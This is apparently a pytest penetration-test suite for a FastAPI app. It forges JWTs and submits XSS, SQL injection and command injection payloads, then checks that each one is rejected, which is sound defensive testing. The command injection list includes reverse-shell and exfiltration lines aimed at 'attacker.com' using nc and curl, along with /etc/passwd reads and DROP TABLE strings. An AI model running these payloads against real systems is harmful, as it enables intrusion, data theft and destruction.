"""
Penetration testing scenarios for authentication and authorization systems.

This module contains advanced security tests that simulate real-world
attack scenarios to validate the security posture of the application.
"""

import pytest
import jwt
import time
import json
from datetime import datetime, timedelta, timezone
from unittest.mock import Mock, patch
from fastapi.testclient import TestClient
from sqlalchemy.ext.asyncio import AsyncSession

from app.core.security import create_access_token, SECRET_KEY, ALGORITHM
from app.models.user import User


class TestAuthenticationPenetrationTesting:
    """Advanced authentication penetration testing."""
    
    @pytest.mark.asyncio
    async def test_jwt_algorithm_confusion_attack(self, client: TestClient):
        """Test JWT algorithm confusion attack (HS256 vs RS256)."""
        # Create a token with 'none' algorithm
        payload = {
            "sub": "123",
            "username": "admin",
            "exp": datetime.now(timezone.utc) + timedelta(hours=1)
        }
        
        # Try 'none' algorithm attack
        none_token = jwt.encode(payload, "", algorithm="none")
        headers = {"Authorization": f"Bearer {none_token}"}
        
        response = client.get("/api/v1/users/me/profile", headers=headers)
        assert response.status_code == 401, "None algorithm attack should be rejected"
        
        # Try algorithm confusion with public key
        try:
            # This would typically use a public key, but we'll simulate
            confused_token = jwt.encode(payload, SECRET_KEY, algorithm="HS256")
            # Modify the header to claim RS256
            header, payload_part, signature = confused_token.split('.')
            
            # Decode and modify header
            import base64
            header_data = json.loads(base64.urlsafe_b64decode(header + '=='))
            header_data['alg'] = 'RS256'
            
            # Re-encode header
            new_header = base64.urlsafe_b64encode(
                json.dumps(header_data).encode()
            ).decode().rstrip('=')
            
            malicious_token = f"{new_header}.{payload_part}.{signature}"
            headers = {"Authorization": f"Bearer {malicious_token}"}
            
            response = client.get("/api/v1/users/me/profile", headers=headers)
            assert response.status_code == 401, "Algorithm confusion attack should be rejected"
            
        except Exception:
            # If JWT library prevents this, that's good
            pass
    
    @pytest.mark.asyncio
    async def test_jwt_key_confusion_attack(self, client: TestClient):
        """Test JWT key confusion attacks."""
        # Try using a weak key
        weak_keys = ["", "a", "123", "password", "secret"]
        
        for weak_key in weak_keys:
            payload = {
                "sub": "123",
                "username": "admin",
                "exp": datetime.now(timezone.utc) + timedelta(hours=1)
            }
            
            try:
                weak_token = jwt.encode(payload, weak_key, algorithm="HS256")
                headers = {"Authorization": f"Bearer {weak_token}"}
                
                response = client.get("/api/v1/users/me/profile", headers=headers)
                assert response.status_code == 401, f"Weak key attack should be rejected: {weak_key}"
                
            except Exception:
                # If JWT creation fails, that's expected for very weak keys
                pass
    
    @pytest.mark.asyncio
    async def test_jwt_timing_attack_resistance(self, client: TestClient):
        """Test resistance to JWT timing attacks."""
        # Create valid and invalid tokens
        valid_payload = {
            "sub": "123",
            "username": "testuser",
            "exp": datetime.now(timezone.utc) + timedelta(hours=1)
        }
        valid_token = create_access_token(valid_payload)
        
        # Create invalid token with wrong signature
        invalid_token = valid_token[:-10] + "invalid123"
        
        # Measure response times
        times_valid = []
        times_invalid = []
        
        for _ in range(10):
            # Valid token
            start = time.time()
            response = client.get(
                "/api/v1/users/me/profile",
                headers={"Authorization": f"Bearer {valid_token}"}
            )
            times_valid.append(time.time() - start)
            
            # Invalid token
            start = time.time()
            response = client.get(
                "/api/v1/users/me/profile",
                headers={"Authorization": f"Bearer {invalid_token}"}
            )
            times_invalid.append(time.time() - start)
        
        # Response times should be similar to prevent timing attacks
        avg_valid = sum(times_valid) / len(times_valid)
        avg_invalid = sum(times_invalid) / len(times_invalid)
        
        # Allow some variance but not too much (increased tolerance for CI/test environments)
        time_diff_ratio = abs(avg_valid - avg_invalid) / max(avg_valid, avg_invalid)
        assert time_diff_ratio < 0.8, "Timing attack vulnerability detected"
    
    @pytest.mark.asyncio
    async def test_session_fixation_attack(self, client: TestClient):
        """Test session fixation attack prevention."""
        # Try to set a specific session/token ID
        malicious_headers = {
            "X-Session-ID": "attacker_controlled_session",
            "X-Request-ID": "attacker_request_id",
            "X-Correlation-ID": "attacker_correlation"
        }
        
        response = client.post(
            "/api/v1/auth/login",
            json={"username": "testuser", "password": "testpass123"},
            headers=malicious_headers
        )
        
        # Should not use attacker-controlled session identifiers
        if response.status_code == 200:
            # Check that response doesn't echo back attacker-controlled IDs
            response_text = response.text
            assert "attacker_controlled_session" not in response_text
            assert "attacker_request_id" not in response_text
            assert "attacker_correlation" not in response_text
    
    @pytest.mark.asyncio
    async def test_password_brute_force_protection(self, client: TestClient):
        """Test password brute force protection."""
        # Attempt multiple failed logins
        for i in range(10):
            response = client.post("/api/v1/auth/login", json={
                "email": "testuser@example.com",
                "password": f"wrongpassword{i}"
            })
            
            # Should eventually start rate limiting or account locking
            if i > 5:  # After several attempts
                assert response.status_code in [401, 429], "Should implement brute force protection"
    
    @pytest.mark.asyncio
    async def test_credential_stuffing_protection(self, client: TestClient):
        """Test credential stuffing attack protection."""
        # Common username/password combinations
        common_credentials = [
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "123456"),
            ("user", "user"),
            ("test", "test"),
            ("guest", "guest"),
            ("root", "root"),
            ("administrator", "password"),
        ]
        
        for username, password in common_credentials:
            response = client.post("/api/v1/auth/login", json={
                "username": username,
                "password": password
            })
            
            # Should not allow common credential combinations
            assert response.status_code != 200, f"Common credentials accepted: {username}/{password}"
    
    @pytest.mark.asyncio
    async def test_token_replay_attack(self, client: TestClient, auth_headers: dict):
        """Test token replay attack prevention."""
        # Use the same token multiple times rapidly
        responses = []
        
        for _ in range(10):
            response = client.get("/api/v1/users/me/profile", headers=auth_headers)
            responses.append(response.status_code)
        
        # All requests should succeed (tokens should be reusable until expiry)
        # But check for any unusual behavior
        assert all(status in [200, 401] for status in responses), "Unexpected response to token reuse"
    
    @pytest.mark.asyncio
    async def test_privilege_escalation_attempts(self, client: TestClient, auth_headers: dict):
        """Test privilege escalation attempts."""
        # Try to access admin endpoints (if they exist)
        admin_endpoints = [
            "/api/v1/admin/users",
            "/api/v1/admin/posts",
            "/api/v1/admin/config",
            "/api/v1/system/config",
            "/api/v1/internal/metrics",
        ]
        
        for endpoint in admin_endpoints:
            response = client.get(endpoint, headers=auth_headers)
            
            # Should deny access to admin endpoints for regular users
            assert response.status_code in [403, 404], f"Privilege escalation possible: {endpoint}"
    
    @pytest.mark.asyncio
    async def test_jwt_claim_manipulation(self, client: TestClient):
        """Test JWT claim manipulation attacks."""
        # Create token with manipulated claims
        malicious_payloads = [
            {"sub": "123", "role": "admin", "exp": datetime.now(timezone.utc) + timedelta(hours=1)},
            {"sub": "123", "is_admin": True, "exp": datetime.now(timezone.utc) + timedelta(hours=1)},
            {"sub": "123", "permissions": ["admin", "superuser"], "exp": datetime.now(timezone.utc) + timedelta(hours=1)},
            {"sub": "1'; DROP TABLE users; --", "exp": datetime.now(timezone.utc) + timedelta(hours=1)},
        ]
        
        for payload in malicious_payloads:
            try:
                malicious_token = jwt.encode(payload, "wrong_secret", algorithm=ALGORITHM)
                headers = {"Authorization": f"Bearer {malicious_token}"}
                
                response = client.get("/api/v1/users/me/profile", headers=headers)
                
                # Should reject tokens with wrong signature
                assert response.status_code == 401, f"Malicious token accepted: {payload}"
                
            except Exception:
                # If token creation fails, that's expected
                pass


class TestAuthorizationPenetrationTesting:
    """Advanced authorization penetration testing."""
    
    @pytest.mark.asyncio
    async def test_horizontal_privilege_escalation(self, client: TestClient, auth_headers: dict):
        """Test horizontal privilege escalation (accessing other users' data)."""
        # Try to access other users' data
        other_user_ids = [999, 1000, 1001, "admin", "root"]
        
        for user_id in other_user_ids:
            endpoints_to_test = [
                f"/api/v1/users/{user_id}/profile",
                f"/api/v1/users/{user_id}/posts",
            ]
            
            for endpoint in endpoints_to_test:
                response = client.get(endpoint, headers=auth_headers)
                
                # Should deny access to other users' data
                assert response.status_code in [403, 404], f"Horizontal escalation: {endpoint}"
    
    @pytest.mark.asyncio
    async def test_vertical_privilege_escalation(self, client: TestClient, auth_headers: dict):
        """Test vertical privilege escalation (accessing higher privilege functions)."""
        # Try to access administrative functions
        admin_actions = [
            ("DELETE", "/api/v1/users/999"),
            ("PUT", "/api/v1/users/999/role", {"role": "admin"}),
            ("POST", "/api/v1/admin/announcements", {"message": "test"}),
            ("DELETE", "/api/v1/posts/999"),  # Delete other users' posts
        ]
        
        for method, endpoint, *data in admin_actions:
            json_data = data[0] if data else {}
            
            if method == "GET":
                response = client.get(endpoint, headers=auth_headers)
            elif method == "POST":
                response = client.post(endpoint, json=json_data, headers=auth_headers)
            elif method == "PUT":
                response = client.put(endpoint, json=json_data, headers=auth_headers)
            elif method == "DELETE":
                response = client.delete(endpoint, headers=auth_headers)
            
            # Should deny access to administrative functions
            assert response.status_code in [403, 404, 405], f"Vertical escalation: {method} {endpoint}"
    
    @pytest.mark.asyncio
    async def test_insecure_direct_object_references(self, client: TestClient, auth_headers: dict):
        """Test Insecure Direct Object References (IDOR)."""
        # Try to access objects by guessing IDs
        object_ids = [
            "1", "2", "3", "999", "1000",
            "00000000-0000-0000-0000-000000000001",
            "ffffffff-ffff-ffff-ffff-ffffffffffff",
            "../admin", "../../etc/passwd",
        ]
        
        endpoints_patterns = [
            "/api/v1/posts/{}",
            "/api/v1/users/{}/profile",
        ]
        
        for pattern in endpoints_patterns:
            for obj_id in object_ids:
                endpoint = pattern.format(obj_id)
                response = client.get(endpoint, headers=auth_headers)
                
                # Should properly validate object ownership/permissions
                if response.status_code == 200:
                    # If access is allowed, verify it's legitimate
                    data = response.json()
                    # This would need specific validation based on the endpoint
                    # For now, just ensure no sensitive data is exposed
                    response_text = response.text.lower()
                    sensitive_fields = ["password", "secret", "private_key", "admin"]
                    for field in sensitive_fields:
                        assert field not in response_text, f"Sensitive data exposed: {endpoint}"
    
    @pytest.mark.asyncio
    async def test_mass_assignment_vulnerabilities(self, client: TestClient, auth_headers: dict):
        """Test mass assignment vulnerabilities."""
        # Try to set unauthorized fields in profile update
        malicious_profile_data = {
            "bio": "Updated bio",
            "is_admin": True,
            "role": "admin",
            "permissions": ["admin", "superuser"],
            "password": "newpassword",
            "id": 999,
            "created_at": "2020-01-01T00:00:00Z",
            "is_verified": True,
            "credits": 1000000,
        }
        
        response = client.put(
            "/api/v1/users/me/profile",
            json=malicious_profile_data,
            headers=auth_headers
        )
        
        if response.status_code == 200:
            profile_data = response.json()["data"]
            
            # Should not allow setting unauthorized fields
            unauthorized_fields = ["is_admin", "role", "permissions", "password", "id", "credits"]
            for field in unauthorized_fields:
                assert field not in profile_data or profile_data[field] != malicious_profile_data[field], \
                    f"Mass assignment vulnerability: {field}"
    
    @pytest.mark.asyncio
    async def test_parameter_pollution_attacks(self, client: TestClient, auth_headers: dict):
        """Test HTTP Parameter Pollution attacks."""
        # Try parameter pollution in query strings
        polluted_endpoints = [
            "/api/v1/posts?limit=10&limit=1000",  # Try to bypass limits
            "/api/v1/users/search?q=test&q=admin",  # Try to inject admin search
            "/api/v1/posts?user_id=123&user_id=999",  # Try to access multiple users
        ]
        
        for endpoint in polluted_endpoints:
            response = client.get(endpoint, headers=auth_headers)
            
            # Should handle parameter pollution gracefully
            assert response.status_code in [200, 400, 422], f"Parameter pollution error: {endpoint}"
            
            # Should not expose unauthorized data
            if response.status_code == 200:
                response_text = response.text.lower()
                assert "admin" not in response_text or "administrator" not in response_text


class TestInputValidationPenetrationTesting:
    """Advanced input validation penetration testing."""
    
    @pytest.mark.asyncio
    async def test_advanced_xss_payloads(self, client: TestClient, auth_headers: dict):
        """Test advanced XSS payloads."""
        advanced_xss_payloads = [
            # Event handler XSS
            "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
            "<svg onload=alert(/XSS/)>",
            "<body onpageshow=alert(1)>",
            
            # JavaScript protocol XSS
            "<a href=javascript:alert(1)>click</a>",
            "<iframe src=javascript:alert(1)></iframe>",
            
            # Data URI XSS
            "<iframe src=data:text/html,<script>alert(1)</script>></iframe>",
            
            # CSS-based XSS
            "<style>@import'javascript:alert(1)';</style>",
            "<link rel=stylesheet href=javascript:alert(1)>",
            
            # Encoded XSS
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "&#60;script&#62;alert(1)&#60;/script&#62;",
            
            # Filter bypass attempts
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
            "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",  # base64 encoded alert(1)
            
            # DOM-based XSS
            "<img src=x onerror=document.location='javascript:alert(1)'>",
        ]
        
        for payload in advanced_xss_payloads:
            # Test in post content
            response = client.post(
                "/api/v1/posts",
                json={"content": payload, "post_type": "spontaneous"},
                headers=auth_headers
            )
            
            if response.status_code in [200, 201]:
                post_data = response.json()  # Response is direct, not wrapped in "data"
                content = post_data["content"]
                
                # Should sanitize all XSS attempts
                dangerous_patterns = [
                    "<script", "javascript:", "onerror=", "onload=", "alert(",
                    "eval(", "document.", "window.", "location=", "@import"
                ]
                
                for pattern in dangerous_patterns:
                    assert pattern.lower() not in content.lower(), \
                        f"XSS not prevented: {payload} -> {content}"
    
    @pytest.mark.asyncio
    async def test_advanced_sql_injection_payloads(self, client: TestClient, auth_headers: dict):
        """Test advanced SQL injection payloads."""
        advanced_sql_payloads = [
            # Union-based injection
            "' UNION SELECT username, password FROM users--",
            "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
            
            # Boolean-based blind injection
            "' AND (SELECT COUNT(*) FROM users) > 0--",
            "' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--",
            
            # Time-based blind injection
            "'; WAITFOR DELAY '00:00:05'--",
            "' AND (SELECT SLEEP(5))--",
            
            # Error-based injection
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            
            # Stacked queries
            "'; INSERT INTO users (username) VALUES ('hacker')--",
            "'; DROP TABLE posts--",
            
            # Second-order injection
            "admin'/**/UNION/**/SELECT/**/password/**/FROM/**/users--",
            
            # NoSQL injection (for MongoDB-like queries)
            "' || '1'=='1",
            "'; return true; var x='",
        ]
        
        for payload in advanced_sql_payloads:
            # Test in search functionality
            response = client.post(
                "/api/v1/users/search",
                json={"q": payload},
                headers=auth_headers
            )
            
            # Should not return SQL errors or unauthorized data
            assert response.status_code in [200, 400, 422], f"SQL injection payload: {payload}"
            
            if response.status_code == 200:
                response_text = response.text.lower()
                
                # Should not expose SQL error messages
                sql_errors = [
                    "sql syntax", "mysql", "postgresql", "sqlite", "syntax error",
                    "table", "column", "database", "select", "union", "where"
                ]
                
                for error in sql_errors:
                    assert error not in response_text, f"SQL error exposed: {payload}"
    
    @pytest.mark.asyncio
    async def test_advanced_command_injection_payloads(self, client: TestClient, auth_headers: dict):
        """Test advanced command injection payloads."""
        command_injection_payloads = [
            # Basic command injection
            "; cat /etc/passwd",
            "| whoami",
            "&& id",
            
            # Encoded command injection
            "%3B%20cat%20%2Fetc%2Fpasswd",
            "%7C%20whoami",
            
            # Command substitution
            "`cat /etc/passwd`",
            "$(cat /etc/passwd)",
            "${cat /etc/passwd}",
            
            # Time-based command injection
            "; sleep 5",
            "| ping -c 5 127.0.0.1",
            
            # Blind command injection
            "; curl http://attacker.com/$(whoami)",
            "| nc attacker.com 4444 -e /bin/bash",
            
            # Filter bypass
            ";c'a't /e't'c/p'a's's'w'd",
            "|w`h`o`a`m`i",
            
            # PowerShell injection (Windows)
            "; powershell -c Get-Process",
            "| powershell -enc <base64>",
        ]
        
        for payload in command_injection_payloads:
            # Test in profile fields
            response = client.put(
                "/api/v1/users/me/profile",
                json={"bio": payload, "city": payload},
                headers=auth_headers
            )
            
            if response.status_code == 200:
                profile_data = response.json()["data"]
                
                # Should not execute commands or expose system info
                for field in ["bio", "city"]:
                    if field in profile_data:
                        field_value = profile_data[field].lower()
                        
                        # Should not contain command execution results
                        command_results = [
                            "uid=", "gid=", "root:", "/bin/bash", "/etc/passwd",
                            "system32", "administrator", "process"
                        ]
                        
                        for result in command_results:
                            assert result not in field_value, \
                                f"Command injection detected: {payload} -> {field_value}"
    
    @pytest.mark.asyncio
    async def test_file_upload_security(self, client: TestClient, auth_headers: dict):
        """Test file upload security vulnerabilities."""
        # This would test actual file upload if the endpoint exists
        # For now, test the validation logic
        
        from app.core.input_sanitization import InputSanitizer
        sanitizer = InputSanitizer()
        
        # Test malicious file types
        malicious_files = [
            ("malware.exe", "application/exe", 1024),
            ("script.php", "application/php", 1024),
            ("shell.jsp", "application/jsp", 1024),
            ("backdoor.asp", "application/asp", 1024),
            ("virus.bat", "application/bat", 1024),
            ("trojan.scr", "application/scr", 1024),
            ("../../../etc/passwd", "text/plain", 1024),
            ("shell.php.jpg", "image/jpeg", 1024),  # Double extension
        ]
        
        for filename, content_type, file_size in malicious_files:
            result = sanitizer.validate_file_upload(
                filename=filename,
                content_type=content_type,
                file_size=file_size,
                allowed_types=["image/jpeg", "image/png"],
                max_size=10 * 1024 * 1024
            )
            
            # Should reject malicious files
            if filename.endswith(('.exe', '.php', '.jsp', '.asp', '.bat', '.scr')):
                assert result["valid"] is False, f"Malicious file type accepted: {filename}"
            
            # Should sanitize filenames
            assert "../" not in result["safe_filename"], f"Path traversal in filename: {filename}"
            assert "\\" not in result["safe_filename"], f"Path traversal in filename: {filename}"


class TestSessionManagementPenetrationTesting:
    """Advanced session management penetration testing."""
    
    @pytest.mark.asyncio
    async def test_session_hijacking_resistance(self, client: TestClient, auth_headers: dict):
        """Test session hijacking resistance."""
        # Try to use token from different IP/User-Agent
        hijacked_headers = {
            **auth_headers,
            "X-Forwarded-For": "192.168.1.100",  # Different IP
            "User-Agent": "Malicious Browser 1.0"  # Different User-Agent
        }
        
        response = client.get("/api/v1/users/me/profile", headers=hijacked_headers)
        
        # Should still work (IP/User-Agent binding is not typically enforced for usability)
        # But should log suspicious activity
        assert response.status_code in [200, 401], "Session hijacking test"
    
    @pytest.mark.asyncio
    async def test_concurrent_session_handling(self, client: TestClient, auth_headers: dict):
        """Test concurrent session handling."""
        # Make multiple concurrent requests with same token
        import asyncio
        import aiohttp
        
        # This would require async HTTP client for true concurrency testing
        # For now, test sequential requests
        responses = []
        for _ in range(5):
            response = client.get("/api/v1/users/me/profile", headers=auth_headers)
            responses.append(response.status_code)
        
        # All requests should succeed or fail consistently
        assert all(status == responses[0] for status in responses), \
            "Inconsistent concurrent session handling"
    
    @pytest.mark.asyncio
    async def test_token_leakage_prevention(self, client: TestClient, auth_headers: dict):
        """Test token leakage prevention."""
        # Make request and check response for token leakage
        response = client.get("/api/v1/users/me/profile", headers=auth_headers)
        
        if response.status_code == 200:
            response_text = response.text
            
            # Should not leak tokens in response
            token = auth_headers["Authorization"].replace("Bearer ", "")
            assert token not in response_text, "Token leaked in response"
            
            # Should not leak sensitive headers
            sensitive_patterns = ["bearer", "authorization", "jwt", "token"]
            response_lower = response_text.lower()
            
            for pattern in sensitive_patterns:
                # Allow these words in normal context, but not as values
                if pattern in response_lower:
                    # Make sure it's not a leaked token value
                    assert len(token) < 10 or token[:10] not in response_text, \
                        f"Potential token leakage: {pattern}"